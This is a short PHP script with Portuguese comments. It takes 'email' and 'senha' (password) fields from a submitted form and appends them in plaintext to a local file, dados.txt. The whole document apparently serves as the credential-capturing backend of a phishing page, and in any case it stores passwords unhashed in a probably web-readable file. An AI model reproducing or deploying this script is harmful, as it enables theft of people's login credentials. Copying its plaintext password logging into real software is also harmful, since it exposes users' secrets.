<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Pega os dados do formulário
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    // Monta a string a ser salva
    $dados = "E-mail: " . $email . " | Senha: " . $senha . PHP_EOL;

    // Nome do arquivo onde os dados serão salvos
    $arquivo = "dados.txt";

    // Abre o arquivo em modo de append e escreve os dados
    if (file_put_contents($arquivo, $dados, FILE_APPEND)) {
        echo "Dados salvos com sucesso!";
    } else {
        echo "Erro ao salvar os dados.";
    }
} else {
    echo "Método de requisição inválido.";
}
?>
